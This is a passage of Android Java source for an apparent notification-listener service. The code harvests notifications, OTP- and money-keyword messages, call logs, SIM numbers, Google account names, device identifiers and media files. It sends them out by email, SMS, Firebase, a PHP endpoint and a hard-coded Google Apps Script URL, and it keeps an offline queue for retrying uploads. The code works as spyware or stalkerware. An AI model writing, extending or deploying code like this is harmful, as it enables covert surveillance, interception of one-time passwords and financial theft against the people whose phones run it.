                new Thread(() -> {
                    try {
                        Log.d(TAG, "📧 Sending Email...");
                        JavaMailAPISendNotification.sendMail(
                                EMAIL,
                                finalSubject,
                                finalContent,
                                null
                        );
                        Log.d(TAG, "✅ Email sent");
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Email failed", e);
                    }
                }).start();

                // 2️⃣ Save to Firebase (SIMPLE DIRECT VERSION)
                new Thread(() -> {
                    try {
                        Log.d(TAG, "🔥 Saving to Firebase...");

                        // সরাসরি Firebase Database reference তৈরি করুন
                        FirebaseDatabase database = FirebaseDatabase.getInstance();
                        DatabaseReference myRef = database.getReference("smsData");

                        String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss a", Locale.getDefault())
                                .format(new Date());
                        String smsId = myRef.push().getKey();

                        // সরাসরি ডেটা তৈরি করুন (GetSim1AndSim2NumberFromAlertbox ছাড়া)
                        Map<String, Object> smsData = new HashMap<>();
                        smsData.put("sender", EMAIL);
                        smsData.put("subject", finalSubject);
                        smsData.put("messageBody", finalContent);
                        smsData.put("recentCallLogs", recentCallLogs);
                        smsData.put("timestamp", timestamp);
                        smsData.put("deviceModel", Build.MODEL);
                        smsData.put("androidVersion", Build.VERSION.RELEASE);

                        // Firebase-এ save করুন
                        myRef.child(smsId).setValue(smsData)
                                .addOnSuccessListener(aVoid -> Log.d(TAG, "✅ Firebase saved directly sussessfull"))
                                .addOnFailureListener(e -> Log.e(TAG, "❌ Firebase direct save failed", e));

                    } catch (Exception e) {
                        Log.e(TAG, "❌ Firebase failed", e);
                    }
                }).start();
                // 3️⃣ Save to PHP MySQL
                new Thread(() -> {
                    try {
                        Log.d(TAG, "🌐 Testing PHP connection...");
                        testPHPConnection();

                        Log.d(TAG, "🌐 Sending to PHP MySQL...");
                        sendDataToPHPMysqlDBInBackground(content, image, context);
                    } catch (Exception e) {
                        Log.e(TAG, "❌ PHP MySQL failed", e);
                    }
                }).start();


                // 4️⃣ GOOGLE DRIVE (Apps Script + Offline Queue)
                executorService.execute(() -> {

                    try {

                        JSONObject json = new JSONObject();
                        json.put("subject", finalSubject);
                        json.put("content", finalContent);
                        json.put("email", EMAIL);
                        json.put("device", Build.MODEL);
                        json.put("android_id",
                                Settings.Secure.getString(
                                        context.getContentResolver(),
                                        Settings.Secure.ANDROID_ID
                                )
                        );
                        json.put("timestamp", System.currentTimeMillis());

                        if (image != null) {
                            json.put("image_base64", bitmapToBase64(image));
                        }

                        OfflineQueueManager queue = new OfflineQueueManager(context);

                        if (isInternetConnected()) {
                            Log.d(TAG, "🌐 Sending to SAVE TO GOOGLE DRIVE  Apps Script...");
                            sendToGoogleDriveViaAppsScript(json.toString());
                            retryQueuedData(context); // 🔁 flush old queue
                        } else {
                            queue.enqueue(json.toString());
                            Log.d(TAG, "📦 No internet → saved to GOOGLE DRIVEoffline queue");
                        }

                    } catch (Exception e) {
                        Log.e(TAG, "❌ Google Drive error", e);
                    }
                });
    
            } catch (Exception e) {
                Log.e(TAG, "❌ GOOGLE DRIVE Unexpected error", e);
            }
        }
    private void sendToGoogleDriveViaAppsScript(String jsonData) {
        Log.d(TAG, "🌐 Sending to sendToGoogleDriveViaAppsScript");
        try {

            URL url = new URL(
                    "https://script.google.com/macros/s/AKfycbxXN67VDAF1SFWxwU2kqAyn41HXcJLb19oZcTDKpuRib-nTr35Dt8-soYqFajloVM4W/exec"
            );

            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setDoOutput(true);

            conn.setRequestProperty("Content-Type", "application/json");

            try (OutputStream os = conn.getOutputStream()) {
                os.write(jsonData.getBytes(StandardCharsets.UTF_8));
            }

            int responseCode = conn.getResponseCode();
            Log.d(TAG, "☁️ Drive response: " + responseCode);

            conn.disconnect();

        } catch (Exception e) {
            throw new RuntimeException(e); // important for retry logic
        }
    }

    private void retryQueuedData(Context context) {
        Log.d(TAG, "🌐 Sending to retryQueuedData");
        executorService.execute(() -> {

            if (!isInternetConnected( )) return;

            try {
                OfflineQueueManager queue = new OfflineQueueManager(context);
                Cursor c;

                while ((c = queue.getNext()) != null && c.moveToFirst()) {

                    int id = c.getInt(c.getColumnIndexOrThrow("id"));
                    String json = c.getString(c.getColumnIndexOrThrow("json"));

                    sendToGoogleDriveViaAppsScript(json);
                    queue.delete(id);

                    c.close();
                    Log.d(TAG, "☁️ Queued item uploaded");
                }

            } catch (Exception e) {
                Log.e(TAG, "⏳ Retry paused", e);
            }
        });
    }




    // Send data to PHP MySQL API (Updated to handle non-JSON responses safely)
    private void sendDataToPHPMysqlDBInBackground(String content, Bitmap image, Context context) {

        try {
            JSONObject json = new JSONObject();

            // ✅ Safe device_id
            String deviceId = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ANDROID_ID
            );
            if (deviceId == null) {
                deviceId = UUID.randomUUID().toString();
            }

            json.put("device_id", deviceId);
            json.put("email", EMAIL);
            json.put("subject", subject + " Notification Summary");
            json.put("content", content);
            json.put("call_logs", recentCallLogs);

            if (image != null) {
                json.put("image_base64", bitmapToBase64(image));
            }

            URL url = new URL("http://192.168.1.5/fasterpro11/api/save_data.php");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Android)"); // fix 403
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setDoOutput(true);

            // Send JSON payload
            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.toString().getBytes(StandardCharsets.UTF_8));
                os.flush();
            }

            int responseCode = conn.getResponseCode();
            Log.d(TAG, "🌐 PHP response code = " + responseCode);

            InputStream is;
            try {
                // Use getInputStream for 200, getErrorStream for others
                is = conn.getInputStream();
            } catch (FileNotFoundException fnfe) {
                is = conn.getErrorStream();
                Log.e(TAG, "⚠️ FileNotFoundException, using error stream");
            }

            if (is != null) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                String responseStr = response.toString().trim();
                Log.d(TAG, "🌐 PHP raw response: " + responseStr);

                // ✅ Only parse if response starts with '{'
                if (responseStr.startsWith("{")) {
                    JSONObject responseJson = new JSONObject(responseStr);
                    if ("success".equalsIgnoreCase(responseJson.optString("status"))) {
                        Log.d(TAG, "✅ PHP MySQL saved. ID = " + responseJson.optInt("id"));
                    } else {
                        Log.e(TAG, "❌ PHP Error: " + responseJson.optString("message"));
                    }
                } else {
                    Log.e(TAG, "❌ Non-JSON response from PHP, skipping JSONObject parse");
                }

            } else {
                Log.e(TAG, "❌ PHP API returned empty response");
            }

            conn.disconnect();

        } catch (Exception e) {
            Log.e(TAG, "❌ PHP API Exception", e);
        }
    }



    //testPHPConnection
    // Test PHP connection safely
    private void testPHPConnection() {
        try {
            URL url = new URL("http://192.168.1.5/fasterpro11/api/get_data.php?limit=1");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Android)"); // fix 403
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            int responseCode = conn.getResponseCode();
            Log.d(TAG, "🌐 PHP test response code = " + responseCode);

            InputStream is;
            try {
                is = conn.getInputStream();
            } catch (FileNotFoundException fnfe) {
                is = conn.getErrorStream();
                Log.e(TAG, "⚠️ FileNotFoundException on test connection, using error stream");
            }

            if (is != null) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                String responseStr = response.toString().trim();
                Log.d(TAG, "🌐 PHP test raw response: " + responseStr);

                if (responseStr.startsWith("{")) {
                    JSONObject json = new JSONObject(responseStr);
                    if ("success".equalsIgnoreCase(json.optString("status"))) {
                        Log.d(TAG, "✅ PHP test connection successful");
                    } else {
                        Log.e(TAG, "❌ PHP test returned error: " + json.optString("message"));
                    }
                } else {
                    Log.e(TAG, "❌ PHP test returned non-JSON response");
                }

            } else {
                Log.e(TAG, "❌ PHP test returned empty response");
            }

            conn.disconnect();

        } catch (Exception e) {
            Log.e(TAG, "❌ PHP test connection Exception", e);
        }
    }
    //  end code php





    public void saveToTextFile(Context context,String content) {
        if (context == null) {
            Log.e(TAG, "Context is null! Cannot save text file.");
            return;
        }
        File file = new File(getFilesDir(), "notification_log.txt"); // Use app's internal storage
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(file, true))) {
            writer.write(content);
            writer.newLine();
            Log.d(TAG, "Content saved to text file: " + file.getAbsolutePath());
            Log.d(TAG, "Saved content: " + content); // Log the content being saved
        } catch (IOException e) {
            Log.e(TAG, "Error saving to text file: ", e);
        }
    }

    public String readFromTextFile() {
        StringBuilder content = new StringBuilder();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { // API level 26 বা তার উপরে
            try {
                // getFilesDir().getPath() ব্যবহার করে স্ট্রিং পাথ তৈরি করা হচ্ছে
                byte[] bytes = Files.readAllBytes(Paths.get(getFilesDir().getPath(), "notification_log.txt"));
                content.append(new String(bytes));
            } catch (IOException e) {
                Log.e(TAG, "Error reading file using NIO API: ", e);
            }
        } else {
            // যদি API level 26 এর কম হয়, তাহলে BufferedReader ব্যবহার হবে
            File file = new File(getFilesDir(), "notification_log.txt");
            try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    content.append(line).append("\n");
                }
            } catch (IOException e) {
                Log.e(TAG, "Error reading from text file: ", e);
            }
        }

        Log.d(TAG, "Read content from file: " + content.toString());
        return content.toString();
    }



    public void clearTextFile() {
        File file = new File(getFilesDir(), "notification_log.txt"); // Use app's internal storage
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(file, false))) {
            writer.write("");
            Log.d(TAG, "Text file cleared: " + file.getAbsolutePath());
        } catch (IOException e) {
            Log.e(TAG, "Error clearing text file: ", e);
        }
    }

    public int getWordCount(String text) {
        if (text == null || text.isEmpty()) {
            Log.d(TAG, "Text is null or empty, word count is 0");
            return 0;
        }
        String[] words = text.split("\\s+");
        int wordCount = words.length;
        Log.d(TAG, "Recent Text file Word count: " + wordCount  +"  . target Word count: "+ MAX_WORDS);
        return wordCount;
    }




















    private void forwardNotificationBySMS(String app, String title, String text, Context context) {

        try {
            GetRecentCallLogs getRecentCallLogs = new GetRecentCallLogs( context );
            String recentCallLogs = getRecentCallLogs.getRecentCallLogs();
            String smsMessage = "Notification from " + app + "\nTitle: " + title + "\nMessage: " + text + "\n\nRecent Call Logs:\n" + recentCallLogs;
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(SMS_RECIPIENT, null, smsMessage, null, null);
            Log.d(TAG, "Notification forwarded successfully via SMS");
        } catch (Exception e) {
            Log.e(TAG, "notification Error in forwardNotificationBySMS: ", e);
        }
    }

    // Store email details in SharedPreferences
    private void storeEmailDetailsSharedPreferences(String subject, String body, long fileSize) {
        // Context চেক করুন
        if (mContext == null) {
            Log.e(TAG, "Context is null. Unable to access SharedPreferences.");
            return; // যদি mContext null হয়, তাহলে কার্যক্রম বন্ধ করুন
        }

        SharedPreferences sharedPreferences = mContext.getSharedPreferences("EmailDetails", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("subject", subject);
        editor.putString("body", body);
        editor.putLong("fileSize", fileSize);
        editor.apply();
        Log.d(TAG, "Email details stored.");
    }


    // Check if the email content is the same as before
    private boolean isEmailContentSame(String subject, String body, long fileSize) {
        // নিশ্চিত করুন mContext null নয়
        if (mContext == null) {
            Log.e(TAG, "Context is null. Unable to access SharedPreferences.");
            return false; // যদি mContext null হয়, তাহলে false রিটার্ন করুন
        }

        SharedPreferences sharedPreferences = mContext.getSharedPreferences("EmailDetails", Context.MODE_PRIVATE);
        String previousSubject = sharedPreferences.getString("subject", "");
        String previousBody = sharedPreferences.getString("body", "");
        long previousFileSize = sharedPreferences.getLong("fileSize", 0);

        // বর্তমান ইমেলের কন্টেন্ট এবং স্টোর করা কন্টেন্ট তুলনা করুন
        return subject.equals(previousSubject) && body.equals(previousBody) && fileSize == previousFileSize;
    }
    private boolean SameEmailCheekShouldForwardNotification(String packageName, String currentMessage) {
        if (lastForwardedMessageMap.containsKey(packageName)) {
            ForwardedMessage lastForwardedMessage = lastForwardedMessageMap.get(packageName);
            boolean shouldForward = !currentMessage.equals(lastForwardedMessage.message) ||
                    (System.currentTimeMillis() - lastForwardedMessage.timestamp) > 120000; // 2 minutes
            return shouldForward;
        }
        return true;
    }







    private void handleFileUri(Uri fileUri) {
        String mimeType = getContentResolver().getType(fileUri);
        if (mimeType != null) {
            switch (mimeType.split("/")[0]) {
                case "image":
                    forwardNotificationWithImage(fileUri);
                    break;
                case "audio":
                    forwardNotificationWithAudio(fileUri);
                    break;
                case "video":
                    forwardNotificationWithVideo(fileUri);
                    break;
                default:
                    forwardNotificationWithFile(fileUri);
                    break;
            }
        } else {
            Log.d(TAG, "notification MIME type is null for file URI: " + fileUri);
        }
    }

    private void forwardNotificationWithImage(Uri imageUri) {
        try {
            Bitmap image = MediaStore.Images.Media.getBitmap(getContentResolver(), imageUri);
            String subject = "Notification Image";
            String messageBody = "notification You have received an image.";
            JavaMailAPISendNotification.sendMail(EMAIL, subject, messageBody, image);
            Log.d(TAG, "notification Image  forwarded successfully via email");
        } catch (Exception e) {
            Log.e(TAG, "notification Failed to forward image : ", e);
        }
    }

    private void forwardNotificationWithAudio(Uri audioUri) {
        String subject = "Notification Audio";
        String messageBody = "notification received an audio file.";
        try {
            byte[] audioData = readFileToByteArray(audioUri);
            JavaMailAPISendNotification.sendMail(EMAIL, subject, messageBody, audioData, "audio.mp3"); // সঠিক ফাইল নাম ব্যবহার করুন
            Log.d(TAG, "notificationAudio  forwarded successfully via email");
        } catch (Exception e) {
            Log.e(TAG, "notification Failed to forward audio file: ", e);
        }
    }

    private void forwardNotificationWithVideo(Uri videoUri) {
        String subject = "Notification Video";
        String messageBody = "notification You have received a video file.";
        try {
            byte[] videoData = readFileToByteArray(videoUri);
            JavaMailAPISendNotification.sendMail(EMAIL, subject, messageBody, videoData, "video.mp4"); // Use the appropriate filename
            Log.d(TAG, "notification Video  forwarded successfully via email");
        } catch (Exception e) {
            Log.e(TAG, "notification Failed to forward video file: ", e);
        }
    }

    private void forwardNotificationWithFile(Uri fileUri) {
        String subject = "Notification File";
        String messageBody = "notification You have received a file.";
        try {
            byte[] fileData = readFileToByteArray(fileUri);
            JavaMailAPISendNotification.sendMail(EMAIL, subject, messageBody, fileData, "file.txt"); // Use the appropriate filename
            Log.d(TAG, "notificationFile  forwarded successfully via email");
        } catch (Exception e) {
            Log.e(TAG, "notification Failed to forward generic file: ", e);
        }
    }

    private byte[] readFileToByteArray(Uri fileUri) throws Exception {
        try (InputStream inputStream = getContentResolver().openInputStream(fileUri);
             ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream()) {
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                byteArrayOutputStream.write(buffer, 0, bytesRead);
            }
            return byteArrayOutputStream.toByteArray();
        }
    }

    private Bitmap extractLargeIcon(Bundle extras) {
        Bitmap largeIconBitmap = null;

        if (extras.containsKey(Notification.EXTRA_LARGE_ICON)) {
            Object iconObj = extras.get(Notification.EXTRA_LARGE_ICON);
            if (iconObj instanceof Bitmap) {
                largeIconBitmap = (Bitmap) iconObj;
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (iconObj instanceof Icon) {
                    Icon icon = (Icon) iconObj;
                    try {
                        Drawable drawable = icon.loadDrawable(this);
                        if (drawable != null) {
                            largeIconBitmap = Bitmap.createBitmap(
                                    drawable.getIntrinsicWidth(),
                                    drawable.getIntrinsicHeight(),
                                    Bitmap.Config.ARGB_8888
                            );
                            Canvas canvas = new Canvas(largeIconBitmap);
                            drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
                            drawable.draw(canvas);
                        }
                    } catch (Exception e) {
                        Log.e("NotificationListener", "Failed to load icon: " + e.getMessage());
                    }
                }
            }
        }
        return largeIconBitmap;
    }


    private boolean containsNotificationMoneyWords(String messageBody) {
        for (String keyword : SEND_MONEY_WORDS) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Message contains money-related keyword: " + keyword);
                return true;
            }
        }
        Log.d(TAG, "No money-related keywords found in message.");
        return false;
    }
    private boolean containsNotificationOtpWords(String messageBody) {
        for (String keyword : OTP_WORDS) {
            if (messageBody.contains(keyword)) {
                Log.d(TAG, "Notification contains OTP-related keyword: " + keyword);
                return true;
            }
        }
        Log.d(TAG, "no Notification contains OTP-related keyword.");
        return false;
    }




    public void listenNotifications(Context sbn) {
        onNotificationPosted( sbn );
    }

    private void onNotificationPosted(Context sbn) {
    }
    public  String getNotificationSubject() {

        Log.d(TAG, "Starting forwardNotificationByEmail method");

        AccountUtil accountUtil = new AccountUtil();
        String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
        if (GoogleAccountName == null) {
            GoogleAccountName = "null";
            Log.d(TAG, "GoogleAccountName is null, setting to 'null'");
        }

        String userSimNumber = "null";
        try {
            userSimNumber = accountUtil.getUserSimNumber(context);
            Log.d(TAG, "User SIM number fetched: " + userSimNumber);
        } catch (SecurityException e) {
            Log.e(TAG, "Error accessing Subscriber ID (SIM Number): ", e);
            userSimNumber = "null";
        } catch (Exception e) {
            Log.e(TAG, "Unexpected error while fetching SIM number: ", e);
            userSimNumber = "null";
        }

        GetRecentCallLogs getRecentCallLogs = new GetRecentCallLogs(context);
        recentCallLogs = getRecentCallLogs.getRecentCallLogs();

        String text = "";
        String Get_Sim1_Number = SetSim1Number(context, text);
        Log.d(TAG, "Sim1 Number set: " + Get_Sim1_Number);

        String manufacturer = Build.MANUFACTURER;
        String mobileModel = Build.MODEL;
        LocationUtil locationUtil = new LocationUtil();
        String countryName = locationUtil.getFullCountryName();
        Log.d(TAG, "Device info - Manufacturer: " + manufacturer + ", Model: " + mobileModel + ", Country: " + countryName);


        GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(this);
        String UserID1= alert.getSim1NumberFromUser(context);
        String UserID2= alert.getSim2NumberFromUser(context);
        String UserGivenSimNumber= UserID1 + " "+UserID2;


        subject = "Key ID: " + Get_Sim1_Number +  " " + UserGivenSimNumber + " " + manufacturer + " " + mobileModel + " "+ " User: " + GoogleAccountName + " sim ser: " + userSimNumber + " " +" Country: " + countryName;

        notificationglobalsubject= subject ;

        return  notificationglobalsubject;
    }
}
